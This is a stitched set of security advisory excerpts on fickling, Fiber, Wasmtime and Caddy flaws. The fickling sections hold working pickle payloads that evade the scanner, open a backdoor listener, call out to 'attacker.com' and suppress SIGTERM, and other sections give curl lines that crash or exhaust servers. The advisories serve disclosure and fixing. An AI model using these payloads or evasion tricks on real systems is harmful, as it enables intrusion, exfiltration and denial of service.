`SMTP('attacker.com')` is never flagged.\n\n3. **`__setstate__` exclusion** (`fickle.py:443-446`): BUILD generates a `__setstate__` call which is excluded from the `non_setstate_calls` list. This means BUILD's call is invisible to `OvertlyBadEvals`. Additionally, BUILD consumes the REDUCE result variable, which prevents the `UnusedVariables` checker from flagging the unused assignment (the only remaining detection mechanism).\n\n### Affected versions\n\nAll versions through 0.1.7 (latest as of 2026-02-18).\n\n### Affected APIs\n\n- `fickling.is_likely_safe()` - returns `True` for bypass payloads\n- `fickling.analysis.check_safety()` - returns `AnalysisResults` with `severity = Severity.LIKELY_SAFE`\n- `fickling --check-safety` CLI - exits with code 0\n- `fickling.always_check_safety()` + `pickle.load()` - no `UnsafeFileError` raised, malicious code executes\n- `fickling.check_safety()` context manager + `pickle.load()` - no `UnsafeFileError` raised, malicious code executes\n\n\n\n## PoC\n\nA single pickle that reads `/etc/passwd` AND opens a network connection to an attacker's server, yet fickling reports it as `LIKELY_SAFE`:\n\n```python\nimport io, struct, tempfile, os\n\ndef sbu(s):\n    \"\"\"SHORT_BINUNICODE opcode helper.\"\"\"\n    b = s.encode()\n    return b\"\\x8c\" + struct.pack(\"<B\", len(b)) + b\n\ndef make_exfiltration_pickle():\n    \"\"\"\n    Single pickle that:\n      1.

Demonstrated impacts include:\n\n- **Backdoor network listener**: `socketserver.TCPServer(('0.0.0.0', 9999), BaseRequestHandler)` opens a port on all interfaces, accepting connections from the network. The TCPServer constructor calls `server_bind()` and `server_activate()`, so the port is open immediately after `pickle.loads()` returns.\n- **Process persistence**: `signal.signal(SIGTERM, SIG_IGN)` makes the process ignore SIGTERM. In Kubernetes/Docker/ECS, the orchestrator cannot gracefully shut down the process — the backdoor stays alive for 30+ seconds per restart attempt.\n- **Outbound exfiltration channels**: `smtplib.SMTP('attacker.com')`, `ftplib.FTP('attacker.com')`, `imaplib.IMAP4('attacker.com')`, `poplib.POP3('attacker.com')` open outbound TCP connections. The attacker's server sees the connection and learns the victim's IP and hostname.\n- **File creation on disk**: `sqlite3.connect(path)` creates a file at an attacker-chosen path as a side effect of the constructor.\n- **Additional bypassed modules**: glob.glob, fileinput.input, pathlib.Path, compileall.compile_file, codeop.compile_command, logging.getLogger, zipimport.zipimporter, threading.Thread\n\nA single pickle can combine all of the above (signal suppression + backdoor listener + network callback + file creation) into one payload. In a cloud ML environment, this enables persistent backdoor access while resisting graceful shutdown. 15 top-level stdlib modules bypass detection when BUILD is appended.\n\nThis affects any application using fickling as a safety gate for ML model files.\n\n## Suggested Fix\n\nRestrict `likely_safe_imports` to a curated allowlist of known-safe modules instead of trusting all stdlib modules. Additionally, either remove the `OvertlyBadEvals` exemption for `likely_safe_imports` or expand the `UNSAFE_IMPORTS` blocklist to cover network/file/compilation modules.\n\n## Relationship to GHSA-83pf-v6qq-pwmr\n\nGHSA-83pf-v6qq-pwmr (Low, 2026-02-19) reports 6 network-protocol modules missing from the blocklist. Adding those modules to `UNSAFE_IMPORTS` does NOT fix this vulnerability because the root cause is the `OvertlyBadEvals` exemption for `likely_safe_imports` (`analysis.py:304-310`), which skips calls to ANY stdlib function — not just those 6 modules. Our 15 tested bypass modules include `socketserver`, `signal`, `sqlite3`, `threading`, `compileall`, and others beyond the scope of that advisory.",

It survives all three proposed fixes for the REDUCE+BUILD vulnerability.\n\n## Details\n\nThe vulnerability is a single missing `new_variable()` call in `Obj.run()` (`fickle.py:1333-1350`).\n\n**REDUCE** (`fickle.py:1286-1301`) correctly persists calls to the AST:\n```python\n# Line 1300: call IS saved to module_body\nvar_name = interpreter.new_variable(call)\ninterpreter.stack.append(ast.Name(var_name, ast.Load()))\n```\n\nThe comment on lines 1296-1299 explicitly states: \"if we just save it to the stack, then it might not make it to the final AST unless the stack value is actually used.\"\n\n**OBJ** (`fickle.py:1333-1350`) does exactly what that comment warns against:\n```python\n# Line 1348: call is ONLY on the stack, NOT in module_body\ninterpreter.stack.append(ast.Call(kls, args, []))\n```\n\nWhen the OBJ result is discarded by POP, the `ast.Call` is gone. The decompiled AST shows the import but no function call:\n```python\nfrom smtplib import SMTP    # import present (from STACK_GLOBAL)\nresult = None              # no call to SMTP visible\n```\n\nYet at runtime, `SMTP('127.0.0.1')` executes and opens a TCP connection.\n\n**NEWOBJ** (`fickle.py:1411-1420`) and **NEWOBJ_EX** (`fickle.py:1423-1433`) have the same code pattern but are less exploitable since CPython's NEWOBJ calls `cls.__new__()` (allocation only) while OBJ calls `cls(*args)` (full constructor execution with `__init__` side effects).\n\n### Affected versions\n\nAll versions through 0.1.7 (latest as of 2026-02-19).\n\n### Affected APIs\n\n- `fickling.is_likely_safe()` - returns `True` for bypass payloads\n- `fickling.analysis.check_safety()` - returns `AnalysisResults` with `severity = Severity.LIKELY_SAFE`\n- `fickling --check-safety` CLI - exits with code 0\n- `fickling.always_check_safety()` + `pickle.load()` - no `UnsafeFileError` raised, malicious code executes\n- `fickling.check_safety()` context manager + `pickle.load()` - no `UnsafeFileError` raised, malicious code executes\n\n## PoC\n\nA pickle that opens a TCP connection to an attacker's server via OBJ+POP, yet fickling reports it as `LIKELY_SAFE`:\n\n```python\nimport io, struct\n\ndef sbu(s):\n    \"\"\"SHORT_BINUNICODE opcode helper.\"\"\"\n    b = s.encode()\n    return b\"\\x8c\" + struct.pack(\"<B\", len(b)) + b\n\ndef make_obj_pop_bypass():\n    \"\"\"\n    Pickle that calls smtplib.SMTP('127.0.0.1') at runtime,\n    but the call is invisible to fickling.\n\n    Opcode sequence:\n        MARK\n          STACK_GLOBAL 'smtplib' 'SMTP'   (import persisted to AST)\n          SHORT_BINUNICODE '127.0.0.1'    (argument)\n        OBJ                               (call SMTP('127.0.0.1'), push result)\n                                          (ast.Call on stack only, NOT in AST)\n        POP                               (discard result -> call GONE)\n        NONE\n        STOP\n    \"\"\"\n    buf = io.BytesIO()\n    buf.write(b\"\\x80\\x04\\x95\")  # PROTO 4 + FRAME\n\n    payload = io.BytesIO()\n    payload.write(b\"(\")                              # MARK\n    payload.write(sbu(\"smtplib\") + sbu(\"SMTP\"))      # push module + func strings\n    payload.write(b\"\\x93\")                            # STACK_GLOBAL\n    payload.write(sbu(\"127.0.0.1\"))                   # push argument\n    payload.write(b\"o\")                               # OBJ: call SMTP('127.0.0.1')\n    payload.write(b\"0\")                               # POP: discard result\n    payload.write(b\"N.\")                              # NONE + STOP\n\n    frame_data = payload.getvalue()\n    buf.write(struct.pack(\"<Q\", len(frame_data)))\n    buf.write(frame_data)\n    return buf.getvalue()\n\nimport fickling, tempfile, os\ndata = make_obj_pop_bypass()\npath = os.path.join(tempfile.mkdtemp(), \"bypass.pkl\")\nwith open(path, \"wb\") as f:\n    f.write(data)\n\nprint(fickling.is_likely_safe(path))\n# Output: True  <-- BYPASSED (network connection invisible to fickling)\n```\n\nfickling decompiles this to:\n```python\nfrom smtplib import SMTP\nresult = None\n```\n\nYet at runtime, `SMTP('127.0.0.1')` executes and opens a TCP connection.\n\n**CLI verification:**\n```bash\n$ fickling --check-safety bypass.pkl; echo \"EXIT: $?\"\nEXIT: 0    # BYPASSED\n```\n\n**Comparison with REDUCE (same function, detected):**\n```bash\n$ fickling --check-safety reduce_smtp.pkl; echo \"EXIT: $?\"\nWarning: Fickling detected that the pickle file may be unsafe.\nEXIT: 1    # DETECTED\n```\n\n### Backdoor listener PoC (most impactful)\n\nA pickle that opens a TCP listener on port 9999, binding to all interfaces:\n\n```python\nimport io, struct\n\ndef sbu(s):\n    b = s.encode()\n    return b\"\\x8c\" + struct.pack(\"<B\", len(b)) + b\n\ndef binint(n):\n    return b\"J\" + struct.pack(\"<i\", n)\n\ndef make_backdoor():\n    buf = io.BytesIO()\n    buf.write(b\"\\x80\\x04\\x95\")  # PROTO 4 + FRAME\n\n    payload = io.BytesIO()\n    # OBJ+POP: TCPServer(('0.0.0.0', 9999), BaseRequestHandler)\n    payload.write(b\"(\")                                          # MARK\n    payload.write(sbu(\"socketserver\") + sbu(\"TCPServer\") + b\"\\x93\")  # STACK_GLOBAL\n    payload.write(b\"(\")                                          # MARK (inner tuple)\n    payload.write(sbu(\"0.0.0.0\"))                                # host\n    payload.write(binint(9999))                                  # port\n    payload.write(b\"t\")                                          # TUPLE\n    payload.write(sbu(\"socketserver\") + sbu(\"BaseRequestHandler\") + b\"\\x93\")  # handler\n    payload.write(b\"o\")                                          # OBJ\n    payload.write(b\"0\")                                          # POP\n    payload.write(b\"N.\")                                         # NONE + STOP\n\n    frame_data = payload.getvalue()\n    buf.write(struct.pack(\"<Q\", len(frame_data)))\n    buf.write(frame_data)\n    return buf.getvalue()\n\nimport fickling\ndata = make_backdoor()\nwith open(\"/tmp/backdoor.pkl\", \"wb\") as f:\n    f.write(data)\n\nprint(fickling.is_likely_safe(\"/tmp/backdoor.pkl\"))\n# Output: True  <-- BYPASSED\n\nimport pickle, socket\nserver = pickle.loads(data)\n# Port 9999 is now LISTENING on all interfaces\n\ns = socket.socket()\ns.connect((\"127.0.0.1\", 9999))\nprint(\"Connected to backdoor port!\")  # succeeds\ns.close()\nserver.server_close()\n```\n\n### Multi-stage combined PoC\n\nA single pickle combining signal suppression + backdoor listener + outbound callback + file persistence:\n\n```python\n# All four operations in one pickle, all invisible to fickling:\n# 1. signal.signal(SIGTERM, SIG_IGN) - suppress graceful shutdown\n# 2. socketserver.TCPServer(('0.0.0.0', 9999), BaseRequestHandler) - backdoor\n# 3. smtplib.SMTP('attacker.com') - C2 callback\n# 4. sqlite3.connect('/tmp/.marker') - persistence marker\n\n# fickling reports: LIKELY_SAFE\n# All 4 operations execute at runtime\n```\n\n\n**`always_check_safety()` verification:**\n```python\nimport fickling, pickle\n\nfickling.always_check_safety()\nwith open(\"poc_obj_multi.pkl\", \"rb\") as f:\n    result = pickle.load(f)\n# No UnsafeFileError raised -- all 4 malicious operations executed\n```\n\n## Impact\n\nAn attacker can distribute a malicious pickle file (e.g., a backdoored ML model) that passes all fickling safety checks. Demonstrated impacts:\n\n- **Backdoor network listener**: `socketserver.TCPServer(('0.0.0.0', 9999), BaseRequestHandler)` opens a port on all interfaces. The TCPServer constructor calls `server_bind()` and `server_activate()`, so the port is open immediately after `pickle.loads()` returns.\n- **Process persistence**: `signal.signal(SIGTERM, SIG_IGN)` makes the process ignore SIGTERM. In Kubernetes/Docker/ECS, the backdoor stays alive for 30+ seconds per restart attempt.\n- **Outbound exfiltration**: `smtplib.SMTP('attacker.com')` opens an outbound TCP connection. The attacker's server learns the victim's IP and hostname.\n- **File creation on disk**: `sqlite3.connect(path)` creates a file at an attacker-chosen path.\n\nA single pickle combines all operations. In cloud ML environments, this enables persistent backdoor access while resisting graceful shutdown. This affects any application using fickling as a safety gate for ML model files.\n\nThe bypass works for any stdlib module NOT in fickling's `UNSAFE_IMPORTS` blocklist. Blocked modules (os, subprocess, socket, builtins, etc.) are still detected at the import level.\n\n## Suggested Fix\n\nAdd `new_variable()` to `Obj.run()` (lines 1348 and 1350), applying the same pattern used by `Reduce.run()` (line 1300):\n\n```python\n# fickle.py, Obj.run():\n-       if args or hasattr(kls, \"__getinitargs__\") or not isinstance(kls, type):\n-           interpreter.stack.append(ast.Call(kls, args, []))\n-       else:\n-           interpreter.stack.append(ast.Call(kls, kls, []))\n+       if args or hasattr(kls, \"__getinitargs__\") or not isinstance(kls, type):\n+           call = ast.Call(kls, args, [])\n+       else:\n+           call = ast.Call(kls, kls, [])\n+       var_name = interpreter.new_variable(call)\n+       interpreter.stack.append(ast.Name(var_name, ast.Load()))\n```\n\nAlso apply to `NewObj.run()` (line 1414) and `NewObjEx.run()` (line 1426) for defense in depth.",

The vulnerability results from missing validation during route registration combined with an unbounded array write during request matching.\n\n## Affected Versions\n\n- **Fiber v3.0.0-rc.3** and earlier v3 releases\n- **Fiber v2.52.10** and potentially all v2 releases (confirmed exploitable)\n- Both versions share the same vulnerable routing implementation\n\n## Vulnerability Details\n\n### Root Cause\n\nBoth Fiber v2 and v3 define a fixed-size parameter array in `ctx.go`:\n\n```go\nconst maxParams = 30\n\ntype DefaultCtx struct {\n    values [maxParams]string  // Fixed 30-element array\n    // ...\n}\n```\n\nThe `router.go` `register()` function accepts routes without validating parameter count. When a request matches a route exceeding 30 parameters, the code in `path.go` performs an unbounded write:\n\n- **v3**: `path.go:514`\n- **v2**: `path.go:516`\n\n```go\n// path.go:514 - NO BOUNDS CHECKING\nparams[paramsIterator] = path[:i]\n```\n\nWhen `paramsIterator >= 30`, this triggers:\n```\npanic: runtime error: index out of range [30] with length 30\n```\n\n### Attack Scenario\n\n1. Application registers route with >30 parameters (e.g., via code or dynamic routing):\n   ```go\n   app.Get(\"/api/:p1/:p2/:p3/.../p35\", handler)\n   ```\n\n2. Attacker sends matching HTTP request:\n   ```bash\n   curl http://target/api/v1/v2/v3/.../v35\n   ```\n\n3. Server crashes during request processing with runtime panic\n\n## Proof of Concept\n\n### For Fiber v3\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n\t\"github.com/gofiber/fiber/v3\"\n)\n\nfunc main() {\n\tapp := fiber.New()\n\t\n\t// Register route with 35 parameters (exceeds maxParams=30)\n\tpath := \"/test\"\n\tfor i := 1;

Every GoFiber v3 endpoint is affected regardless of whether the application uses flash messages.\n\n### Details\nRegardless of configuration, the flash cookie is checked:\n\n```go\nfunc (app *App) requestHandler(rctx *fasthttp.RequestCtx) {\n\t// Acquire context from the pool\n\tctx := app.AcquireCtx(rctx)\n\tdefer app.ReleaseCtx(ctx)\n\n\t\t// Optional: Check flash messages\n\t\trawHeaders := d.Request().Header.RawHeaders()\n\t\tif len(rawHeaders) > 0 && bytes.Contains(rawHeaders, flashCookieNameBytes) {\n\t\t\td.Redirect().parseAndClearFlashMessages()\n\t\t}\n\t\t_, err = app.next(d)\n\t} else {\n\t\t// Check if the HTTP method is valid\n\t\tif ctx.getMethodInt() == -1 {\n\t\t\t_ = ctx.SendStatus(StatusNotImplemented) //nolint:errcheck // Always return nil\n\t\t\treturn\n\t\t}\n\n\t\t// Optional: Check flash messages\n\t\trawHeaders := ctx.Request().Header.RawHeaders()\n\t\tif len(rawHeaders) > 0 && bytes.Contains(rawHeaders, flashCookieNameBytes) {\n\t\t\tctx.Redirect().parseAndClearFlashMessages()\n\t\t}\n}\n```\n\nThe cookie value is hex-decoded and passed directly to msgpack deserialization with no size or content validation:\n\nhttps://github.com/gofiber/fiber/blob/f8f34f642fb3682c341ede7816e7cf861aa7df89/redirect.go#L371\n\n```go\n// parseAndClearFlashMessages is a method to get flash messages before they are getting removed\nfunc (r *Redirect) parseAndClearFlashMessages() {\n\t// parse flash messages\n\tcookieValue, err := hex.DecodeString(r.c.Cookies(FlashCookieName))\n\tif err != nil {\n\t\treturn\n\t}\n\n\t_, err = r.c.flashMessages.UnmarshalMsg(cookieValue)\n\tif err != nil {\n\t\treturn\n\t}\n\n\tr.c.Cookie(&Cookie{\n\t\tName:   FlashCookieName,\n\t\tValue:  \"\",\n\t\tPath:   \"/\",\n\t\tMaxAge: -1,\n\t})\n}\n```\n\nThe auto-generated `tinylib/msgp` deserialization reads a `uint32` array header from the attacker-controlled byte stream and passes it directly to `make()` with no bounds check:\n\nhttps://github.com/gofiber/fiber/blob/f8f34f642fb3682c341ede7816e7cf861aa7df89/redirect_msgp.go#L242\n\n```go\n// UnmarshalMsg implements msgp.Unmarshaler\nfunc (z *redirectionMsgs) UnmarshalMsg(bts []byte) (o []byte, err error) {\n\tvar zb0002 uint32\n\tzb0002, bts, err = msgp.ReadArrayHeaderBytes(bts)\n\tif err != nil {\n\t\terr = msgp.WrapError(err)\n\t\treturn o, err\n\t}\n\tif cap((*z)) >= int(zb0002) {\n\t\t(*z) = (*z)[:zb0002]\n\t} else {\n\t\t(*z) = make(redirectionMsgs, zb0002)\n\t}\n\tfor zb0001 := range *z {\n\t\tbts, err = (*z)[zb0001].UnmarshalMsg(bts)\n\t\tif err != nil {\n\t\t\terr = msgp.WrapError(err, zb0001)\n\t\t\treturn o, err\n\t\t}\n\t}\n\to = bts\n\treturn o, err\n}\n```\n\nwhere\n `zb0002, bts, err = msgp.ReadArrayHeaderBytes(bts)` translates the attacker-controlled value into the element count and `make(redirectionMsgs, zb0002)` performs the unbounded allocation\n\nSo we can craft a gofiber cookie that will force a huge allocation: \n`curl -H \"Cookie: fiber_flash=dd7fffffff\" http://localhost:5000/hello`\n\nThe cookie val is a hex-encoded msgpack array32 header:\n- `dd` = msgpack array32 marker\n- `7fffffff` = 2 147 483 647 elements\n\n### Impact\nUnauthenticated remote Denial of Service (CWE-789). Anyone running a gofiber v3.0.0 or v3 server is affected. The flash cookie parsing is hardcoded.",

This affects Fiber v3 through version 3.0.0. This has been patched in Fiber v3 version 3.1.0.\n \n### Details\nThe vulnerability resides in `middleware/static/static.go` within the `sanitizePath` function. This function attempts to sanitize the requested path by checking for backslashes, decoding the URL, and then cleaning the path.\n\nThe vulnerability stems from two combined issues:\n- The check for backslash characters happens before the URL decoding loop. If an attacker sends a double-encoded backslash, the initial check sees `%255C` and passes. The loop then decodes this into a single backslash.\n- The function uses `path.Clean` to clean the resulting string. `path.Clean` is designed for slash-separated paths  and does not recognize backslashes as directory separators. Consequently, sequences like `..\\..\\` are treated as valid filenames.\n\nWhen this sanitized path is later used, the backslashes are interpreted as valid separators, allowing the attacker to traverse up the directory tree.\n```go\n// pkg/static/static.go\nfunc sanitizePath(p []byte, filesystem fs.FS) ([]byte, error) {\n    ...\n    // this check happens BEFORE decoding\n    if bytes.IndexByte(p, '\\\\') >= 0 {\n        ...\n    } \n    // This loop decodes %255C to %5C to \\\n    for strings.IndexByte(s, '%') >= 0 {\n        us, err := url.PathUnescape(s)\n        ...\n        s = us\n    }\n    // path.Clean only understands forward slashes (/)\n    s = pathpkg.Clean(\"/\" + s)\n    ...\n    return utils.UnsafeBytes(s), nil\n}\n```\n\n### Impact\n\nThis impacts Fiber v3 prereleases through stable release version 3.0.0.\n\nSuccessful exploitation requires the server to be using the static middleware on Windows, as this is the only OS where backslashes are treated as directory separators by the file system.\n\nExploitation allows directory traversal on the host server. An attacker can read arbitrary files within the scope of the application server context. Depending on permissions and deployment conditions, attackers may access sensitive files outside the web root, such as configuration files, source code, or system files. Leaking application secrets often leads to further compromise.\n\n### Patches\n\nThis has been [patched](https://github.com/gofiber/fiber/pull/4064) in Fiber v3 version 3.0.1.  Users are strongly encouraged to update to the latest available release.",

          "html": "### Impact\n\nWasmtime's implementation of WASI host interfaces are susceptible to guest-controlled resource exhaustion on the host. Wasmtime did not appropriately place limits on resource allocations requested by the guests. This serves as a Denial of Service vector where a guest can induce a range of crashing behaviors on the host such as:\n\n* Allocating arbitrarily large amounts of host memory.\n* Causing an allocation failure on the host, which in Rust defaults to aborting the process.\n* Causing a panic on the host due to over-large allocations being performed.\n* Cause degredation in performance of the host by holding excessive host memory alive.\n\nWasmtime's [security bug policy](https://docs.wasmtime.dev/security-what-is-considered-a-security-vulnerability.html) considers all of these behaviors a security vulnerability. Wasmtime's implementation of WASI has a number of different ways that resource exhaustion could happen, and fixing any one of them is insufficient from solving this vulnerability. A number of individual issues are grouped within this advisory and as a whole represent the known ways that guests can exhaust resources on the host.\n\nAn example of guest-controlled resource exhaustion within Wasmtime's implementation of WASI is guests could repeatedly allocate handles to themselves without limit. Some APIs also caused the host to perform a guest-controlled-sized allocation of a buffer on the host for I/O operations. Other APIs could force the host to buffer arbitrary amounts of data for the guest. Finally the guest could hand arbitrarily large allocations from itself to the host which could cause the host to perform an arbitrarily sized copy of memory which in some situations could result in quadratically sized allocations.\n\nWasmtime's implementations of WASIp1 and WASIp2 are affected by this vulnerability. Any host API modeled with the Component Model (or WIT) which operates on a `string` or `list<T>` type is also affected. Not all WIT and WASI APIs are affected by this issue, but that's more of an exception so it's recommended for all embedders to consider themselves affected.\n\nTo address this issue a number of mitigations are being applied to limit the behavior of a guest in WASI. All of these mitigations manifest in the form of a limit of some kind applied to various situations, and as such all of these mitigations are backwards-incompatible as they run the risk of breaking preexisting programs. To address this all backports to previous stable releases have these limits tuned to overly-large values. This ensures that preexisting guests do not break while still providing embedders the knobs to prevent this DoS vector as well. The limits added to Wasmtime are:\n\n* `-Smax-resources=N` or `ResourceTable::set_max_capacity` - the maximum number of resources that a guest is allowed to allocate for itself.\n* `-Shostcall-fuel=N` or `Store::set_hostcall_fuel` - the maximum amount of data that the guest may copy to the host in a single function call.\n* `-Smax-random-size=N` or `WasiCtxBuilder::max_random_size` - the maximum size of the return value of `get-random-bytes` and `get-insecure-random-bytes` in the `wasi:random` implementations.\n* `-Smax-http-fields-size=N` or `WasiHttpCtx::set_max_fields_size` - the maximum size of headers for an HTTP request/response.\n\nThese settings are equally applicable to both WASIp1 and WASIp2. Wasmtime 41.0.x and prior previously did not limit these settings and the knobs being released are set to very large values by default to avoid any breaking behavior. Embedders will need to proactively tune these knobs as appropriate for their embeddings. The default settings in the unreleased Wasmtime 42.0.0 are 1M for max resources, 128MiB for hostcall fuel, 64MiB for max-random-size, and 32KiB for http fields size. Tuning is not expected for Wasmtime 42.0.0+.\n\nHosts/embedders affected by this issue are encouraged to audit and double-check their own host APIs they have implemented to see whether they are affected by this issue as well. The `-Shostcall-fuel` setting is intended to be a relatively coarse fix for many possible issues by limiting the amount of data for all host APIs at once, so many embedders may not need to take further action beyond updating Wasmtime and configuring it appropriately (if not updating to 42.0.0). Embedders should audit to see, however, if the guest is able to force the host to allocate on its behalf and ensure that the allocation is limited or tracked somehow.\n\n### Patches\n\nWasmtime 24.0.6, 36.0.6, 40.0.4, 41.0.4, and 42.0.0 have all been released with the fix for this issue. These versions do not prevent this issue in their default configuration to avoid breaking preexisting behaviors. All versions of Wasmtime have appropriate knobs to prevent this behavior, and Wasmtime 42.0.0-and-later will have these knobs tuned by default to prevent this issue from happening.\n\n### Workarounds\n\nThere are no known workarounds for this issue without upgrading. Embedders are recommended to upgrade and configure their embeddings as necessary to prevent possibly-malicious guests from triggering this issue.\n\n### Resources\n\n* [`Store::set_hostcall_fuel`](https://docs.rs/wasmtime/latest/wasmtime/struct.Store.html#method.set_hostcall_fuel)\n* [`ResourceTable::set_max_capacity`](https://docs.rs/wasmtime/latest/wasmtime/component/struct.ResourceTable.html#method.set_max_capacity)\n* [`WasiCtxBuilder::max_random_size`](https://docs.rs/wasmtime-wasi/latest/wasmtime_wasi/struct.WasiCtxBuilder.html#method.max_random_size)\n* [Original PR showing resource exhaustion](https://github.com/bytecodealliance/wasmtime/pull/12599)\n* [Issue about limiting max resource handles per-guest](https://github.com/bytecodealliance/wasmtime/issues/11552)",

However, that implementation had a bug leading to a panic under certain circumstances:\n\n1. The host embedding calls `[Typed]Func::call_async` on a function exported by a component, polling the returned `Future` once.\n2. The component function yields control to the async runtime (e.g. Tokio), e.g. due to a call to host function registered using `LinkerInstance::func_wrap_async` which yields, or due an epoch interruption.\n3. The host embedding drops the `Future` after polling it once.  This leaves the component instance in a non-reenterable state since the call never had a chance to complete.\n4. The host embedding calls `[Typed]Func::call_async` again, polling the returned `Future`.  Since the component instance cannot be entered at this point, the call traps, but not before allocating a task and thread for the call.\n5. The host embedding ignores the trap and drops the `Future`.  This panics due to the runtime attempting to dispose of the task created above, which panics since the thread has not yet exited.\n\n### Impact\nWhen a host embedder using the affected versions of Wasmtime calls `wasmtime::component::[Typed]Func::call_async` on a guest export and then drops the returned future without waiting for it to resolve, and then does so again with the same component instance, Wasmtime will panic. Embeddings that have the `component-model-async` compile-time feature disabled are unaffected.\n\n### Patches\nWasmtime 40.0.4 and 41.0.4 have been patched to fix this issue. Versions 42.0.0 and later are not affected.\n\n### Workarounds\nIf an embedding is not actually using any component-model-async features then disabling the `component-model-async` Cargo feature can work around this issue. This issue can also be worked around by either ensuring every `call_async` future is awaited until it completes or refraining from using the `Store` again after dropping a not-yet-resolved `call_async` future.\n\n### Resources\nThis was first reported in https://bytecodealliance.zulipchat.com/#narrow/channel/206238-general/topic/Panic.20in.20Wasmtime.2041.2E0.2E3.20.28runtime.2Fconcurrent.2Fcomponent.29",

          "html": "### Summary\n\nCaddy's FastCGI path splitting logic computes the split index on a lowercased copy of the request path and then uses that byte index to slice the original path. This is unsafe for Unicode because `strings.ToLower()` can change UTF-8 byte length for some characters. As a result, Caddy can derive an incorrect `SCRIPT_NAME`/`SCRIPT_FILENAME` and `PATH_INFO`, potentially causing a request that contains `.php` to execute a different on-disk file than intended (path confusion). In setups where an attacker can control file contents (e.g., upload features), this can lead to unintended PHP execution of non-.php files (potential RCE depending on deployment).\n\n### Details\n\nThe issue is in `github.com/caddyserver/caddy/modules/caddyhttp/fastcgi.Trasnport.splitPos()` (and the subsequent slicing in `buildEnv()`):\n\n```\nlowerPath := strings.ToLower(path)\nidx := strings.Index(lowerPath, strings.ToLower(split))\nreturn idx + len(split)\n```\n\nThe returned index is computed in the byte space of lowerPath, but `buildEnv()` applies it to the original path:\n\n- `docURI = path[:splitPos]`\n- `pathInfo = path[splitPos:]`\n- `scriptName = strings.TrimSuffix(path, fc.pathInfo)`\n- `scriptFilename = caddyhttp.SanitizedPathJoin(fc.documentRoot, fc.scriptName)`\n\nThis assumes `lowerPath` and `path` have identical byte lengths and identical byte offsets, which is not true for some Unicode case mappings. Certain characters expand when lowercased (UTF-8 byte length increases), shifting the computed index. This creates a mismatch where `.php` is found in the lowercased string at an offset that does not correspond to the same position in the original string, causing the split point to land later/earlier than intended.\n\n### PoC\n\nCreate a small Go program that reproduces Caddy's `splitPos()` behavior (compute the `.php` split point on a lowercased path, then use that byte index on the original path):\n\n1. Save this as `poc.go`:\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\nfunc splitPos(path string, split string) int {\n\tlowerPath := strings.ToLower(path)\n\tidx := strings.Index(lowerPath, strings.ToLower(split))\n\tif idx < 0 {\n\t\treturn -1\n\t}\n\treturn idx + len(split)\n}\n\nfunc main() {\n\t// U+023A: Ⱥ (UTF-8: C8 BA). Lowercase is ⱥ (UTF-8: E2 B1 A5), longer in bytes.\n\tpath := \"/ȺȺȺȺshell.php.txt.php\"\n\tsplit := \".php\"\n\n\tpos := splitPos(path, split)\n\n\tfmt.Printf(\"orig bytes=%d\\n\", len(path))\n\tfmt.Printf(\"lower bytes=%d\\n\", len(strings.ToLower(path)))\n\tfmt.Printf(\"splitPos=%d\\n\", pos)\n\n\tfmt.Printf(\"orig[:pos]=%q\\n\", path[:pos])\n\tfmt.Printf(\"orig[pos:]=%q\\n\", path[pos:])\n\n\t// Expected split: right after the first \".php\" in the original string\n\twant := strings.Index(path, split) + len(split)\n\tfmt.Printf(\"expected splitPos=%d\\n\", want)\n\tfmt.Printf(\"expected orig[:]=%q\\n\", path[:want])\n}\n```\n\n2. Run it:\n\n```console\ngo run poc.go\n```\n\nOutput on my side:\n\n```\norig bytes=26\nlower bytes=30\nsplitPos=22\norig[:pos]=\"/ȺȺȺȺshell.php.txt\"\norig[pos:]=\".php\"\nexpected splitPos=18\nexpected orig[:]=\"/ȺȺȺȺshell.php\"\n```\n\nExpected split is right after the first `.php` (`/ȺȺȺȺshell.php`). Instead, the computed split lands later and cuts the original path after `shell.php.txt`, leaving `.php` as the remainder.\n\n### Impact\n\nSecurity boundary bypass/path confusion in script resolution.\nIn typical deployments, `.php` extension boundaries are relied on to decide what is executed by PHP. This bug can cause Caddy/FPM to execute a different file than intended by confusing `SCRIPT_NAME`/`SCRIPT_FILENAME`. If an attacker can place attacker-controlled content into a file that can be resolved as `SCRIPT_FILENAME` (common in web apps with uploads or writable directories), this can lead to unintended PHP execution of non-.php files and potentially remote code execution. Severity depends on deployment and presence of attacker-controlled file writes, but the primitive itself is remotely triggerable via crafted URLs.\n\nThis vulnerability was initially reported to FrankenPHP (https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38) by @AbdrrahimDahmani. The affected code has been copied/adapted from Caddy, which, according to research, is also affected.\n\nThe patch is a port of the FrankenPHP patch.",

Depending on the deployed configuration/modules, this can:\n- Change admin listener settings (e.g., move the admin listener to a new address)\n- Change HTTP server behavior (e.g., alter routes/responses)\n\n## Suggested remediation\n\nEnsure cross-origin web content cannot trigger `POST /load` on the local admin API by default, for example by:\n- Enabling origin enforcement by default for unsafe methods, and/or\n- Requiring an unguessable token for `/load` (and other state-changing admin endpoints).\n\n[poc.zip](https://github.com/user-attachments/files/25079818/poc.zip)\n[PR_DESCRIPTION.md](https://github.com/user-attachments/files/25079820/PR_DESCRIPTION.md)",

An attacker can bypass host-based routing and any access controls attached to that route by changing the casing of the `Host` header.\n\n### Details\nIn Caddy `v2.10.2`, the `MatchHost` matcher states it matches the Host value case-insensitively:\n\n- `modules/caddyhttp/matchers.go`: `type MatchHost matches requests by the Host value (case-insensitive).`\n\nHowever, in `MatchHost.MatchWithError`, when the host list is considered \"large\" (`len(m) > 100`):\n\n- `MatchHost.large()` returns true for `len(m) > 100` (`modules/caddyhttp/matchers.go`, around the `large()` helper).\n- The matcher takes a \"fast path\" using binary search over the sorted host list, and checks for an exact match using a case-sensitive string comparison (`m[pos] == reqHost`).\n- After the fast path fails, the fallback loop short-circuits for large lists by breaking as soon as it reaches the first non-fuzzy entry. For configs comprised of exact hostnames only (no wildcards/placeholders), this prevents the `strings.EqualFold(reqHost, host)` check from ever running.\n\nNet effect: with a host list length of 101 or more, changing only the casing of the incoming `Host` header can cause the `host` matcher to not match when it should.\n\n#### Suggested fix\n- Normalize exact hostnames to lower-case during `MatchHost.Provision` (at least for non-fuzzy entries).\n- Normalize the incoming request host (`reqHost`) to lower-case before the large-list binary search + equality check, so the optimized path stays case-insensitive.\n\nReproduced on:\n- Stable release: `v2.10.2` -- this is the release I reference in the repro below.\n- Dev build: `v2.11.0-beta.2`.\n- 